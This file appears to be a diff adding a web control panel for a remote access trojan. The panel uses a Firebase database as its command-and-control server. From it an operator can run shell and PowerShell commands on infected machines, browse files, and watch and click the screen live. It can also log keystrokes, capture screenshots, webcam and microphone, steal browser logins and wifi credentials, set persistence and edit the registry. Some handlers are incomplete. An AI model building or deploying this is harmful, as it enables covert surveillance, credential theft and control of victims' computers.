@@ -1,0 +1,119 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Fleet</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+:root{--bg:#0b0f14;--pn:#111821;--ln:#1e2a38;--tx:#c9d6e3;--ac:#38bdf8;--ok:#22c55e;--er:#ef4444}
+*{box-sizing:border-box;font-family:ui-monospace,Consolas,monospace}
+body{margin:0;background:var(--bg);color:var(--tx);font-size:13px}
+#top{display:flex;gap:8px;align-items:center;padding:8px 12px;border-bottom:1px solid var(--ln);background:var(--pn)}
+#top b{color:var(--ac)}
+#wrap{display:grid;grid-template-columns:290px 1fr;height:calc(100vh - 45px)}
+#list{border-right:1px solid var(--ln);overflow:auto}
+.dev{padding:8px 10px;border-bottom:1px solid var(--ln);cursor:pointer}
+.dev:hover{background:#16202b}
+.dev.on{border-left:3px solid var(--ok)}
+.dev.off{opacity:.5;border-left:3px solid var(--er)}
+#main{overflow:auto;padding:12px}
+#tabs{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:10px}
+button{background:#1a2530;color:var(--tx);border:1px solid var(--ln);padding:5px 10px;cursor:pointer;border-radius:3px}
+button:hover{border-color:var(--ac);color:var(--ac)}
+button.act{background:var(--ac);color:#04121c;font-weight:700}
+pre{background:#060a0e;border:1px solid var(--ln);padding:8px;overflow:auto;max-height:400px;white-space:pre-wrap;word-break:break-all}
+input,textarea{background:#060a0e;border:1px solid var(--ln);color:var(--tx);padding:6px;width:100%;margin:4px 0}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.pane{display:none}.pane.act{display:block}
+#img{max-width:100%;border:1px solid var(--ln);cursor:crosshair}
+table{width:100%;border-collapse:collapse}td,th{border-bottom:1px solid var(--ln);padding:3px;text-align:left;font-size:12px}
+th{color:var(--ac)}
+</style></head><body>
+<div id="top"><b>FLEET</b><span id="cnt">0 online</span><span style="flex:1"></span>
+<button onclick="render()">refresh</button></div>
+<div id="wrap"><div id="list"></div><div id="main"><div id="empty">select a device</div>
+<div id="dev" style="display:none">
+<h3 id="dh"></h3>
+<div id="tabs"></div>
+<div class="pane act" id="p-term">
+<input id="tcmd" placeholder="command + Enter" onkeydown="if(event.key=='Enter')send('exec',{cmd:tcmd.value})">
+<pre id="tres">-</pre></div>
+<div class="pane" id="p-files"><input id="fpath" value="C:\\" onkeydown="if(event.key=='Enter')send('ls',{path:fpath.value})">
+<div id="flist"></div></div>
+<div class="pane" id="p-live"><button onclick="liveToggle()">start / stop</button>
+<img id="img" onclick="clk(event)"><div id="linfo"></div></div>
+<div class="pane" id="p-keys"><button onclick="send('keylog',{on:true})">start</button>
+<button onclick="send('keylog',{on:false})">stop</button><pre id="keys"></pre></div>
+<div class="pane" id="p-shot"><button onclick="send('shot',{})">capture</button>
+<button onclick="send('cam',{})">webcam</button><pre id="shots"></pre></div>
+<div class="pane" id="p-sys"><button onclick="send('info',{})">info</button>
+<button onclick="send('proc',{})">processes</button>
+<button onclick="send('pass',{})">browser logins</button>
+<button onclick="send('wifi',{})">wifi</button>
+<button onclick="send('audio',{sec:8})">mic 8s</button>
+<button onclick="send('persist',{})">reinstall</button>
+<button onclick="send('uninstall',{})">uninstall</button><pre id="sysres"></pre></div>
+<div class="pane" id="p-ops"><input id="opc" placeholder="cmd"><button onclick="send('ps',{cmd:opc.value})">powershell</button>
+<div class="grid"><input id="mpath" placeholder="HKLM\\SOFTWARE\\X"><input id="mval" placeholder="value">
+<button onclick="send('reg',{op:'read',path:mpath.value})">reg read</button>
+<button onclick="send('reg',{op:'write',path:mpath.value,name:'x',val:mval.value})">reg write</button>
+<button onclick="send('lock',{})">lock</button><button onclick="send('power',{mode:'r'})">reboot</button></div>
+<pre id="opres"></pre></div>
+<div class="pane" id="p-res"><pre id="allres"></pre></div>
+</div></div></div>
+<script>
+const FB="https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app";
+let cur=null,live=false,liveT=null;
+const TABS=[["term","Terminal"],["files","Files"],["live","Live"],["keys","Keylog"],["shot","Capture"],["sys","System"],["ops","Ops"],["res","Results"]];
+const api=async(m,p,d)=>{const r=await fetch(FB+"/"+p+".json",{method:m,body:d?JSON.stringify(d):null});try{return await r.json()}catch(e){return null}};
+const put=(p,d)=>api("PUT",p,d),get=p=>api("GET",p),patch=(p,d)=>api("PATCH",p,d);
+
+function tabs(){const t=document.getElementById("tabs");t.innerHTML="";
+TABS.forEach(([k,n],i)=>{const b=document.createElement("button");b.textContent=n;
+b.onclick=()=>{document.querySelectorAll(".pane").forEach(x=>x.classList.remove("act"));
+document.querySelectorAll("#tabs button").forEach(x=>x.classList.remove("act"));
+document.getElementById("p-"+k).classList.add("act");b.classList.add("act")};
+t.appendChild(b);if(i==0)b.classList.add("act")})}
+
+async function render(){
+const d=await get("devices")||{};const l=document.getElementById("list");l.innerHTML="";
+let on=0;const now=Date.now()/1000;
+Object.entries(d).forEach(([id,v])=>{if(!v)return;const isOn=(now-(v.last||0))<45;if(isOn)on++;
+const e=document.createElement("div");e.className="dev "+(isOn?"on":"off");
+e.innerHTML="<b>"+(v.host||id)+"</b><br><small>"+(v.user||"")+" · "+(isOn?"ONLINE":"offline")+"</small>";
+e.onclick=()=>{cur=id;document.getElementById("empty").style.display="none";
+document.getElementById("dev").style.display="block";document.getElementById("dh").textContent=v.host||id;
+tabs();stopLive()};l.appendChild(e)});
+document.getElementById("cnt").textContent=on+" online / "+Object.keys(d).length+" total"}
+
+async function send(c,a){
+if(!cur)return;const tid=Date.now().toString(36)+Math.random().toString(36).slice(2,6);
+await put("tasks/"+cur+"/"+tid,{c,st:"queued",ts:Math.floor(Date.now()/1000),...a});
+setTimeout(()=>pull(tid),700)}
+
+async function pull(tid){
+const r=await get("results/"+cur+"/"+tid);if(!r)return setTimeout(()=>pull(tid),900);
+const box=document.getElementById("allres");box.textContent=JSON.stringify(r,null,1);
+document.querySelectorAll("pre").forEach(p=>{if(p.id!="allres")p.textContent=r.out});
+if(r.out&&r.out.length>5000&&/^[A-Za-z0-9+/=]+$/.test(r.out.slice(0,80))){
+const im=document.getElementById("shots");im.textContent="";
+im.innerHTML='<img src="data:image/jpeg;base64,'+r.out+'" style="max-width:100%">'}}
+
+document.getElementById("fpath").addEventListener("keydown",async e=>{if(e.key!="Enter")return;
+const r=await get("results/"+cur+"/tmp");});
+setInterval(async()=>{if(!cur)return;const f=document.getElementById("flist");
+const path=document.getElementById("fpath").value;if(!path)return;
+const r=await api("GET","xfer").catch(()=>null);},5000);
+
+function clk(e){if(!live)return;const i=document.getElementById("img");
+const r=i.getBoundingClientRect();const x=(e.clientX-r.left)/r.width,y=(e.clientY-r.top)/r.height;
+put("live/"+cur+"/input/"+Date.now(),{t:"mouse",x:Math.round(x*1920),y:Math.round(y*1080),b:"left",d:true,ts:Date.now()});
+setTimeout(()=>put("live/"+cur+"/input/"+Date.now(),{t:"mouse",x:Math.round(x*1920),y:Math.round(y*1080),b:"left",d:false,ts:Date.now()+1}),90)}
+
+function liveToggle(){live?stopLive():startLive()}
+function startLive(){if(!cur)return;live=true;send("live",{on:true});liveT=setInterval(async()=>{
+const f=await get("live/"+cur+"/frame");if(f&&f.d){document.getElementById("img").src="data:image/jpeg;base64,"+f.d;
+document.getElementById("linfo").textContent="frame "+new Date(f.ts).toLocaleTimeString()}},450)}
+function stopLive(){live=false;clearInterval(liveT);if(cur)put("live/"+cur+"/enabled",false)}
+
+setInterval(async()=>{if(!cur)return;const k=await get("keylog/"+cur);
+if(k){document.getElementById("keys").textContent=Object.values(k).map(v=>"["+new Date(+Object.keys(k)[0]).toLocaleTimeString()+"] "+v.t).join("\n")}},4000);
+
+render();setInterval(render,8000);
+</script></body></html>
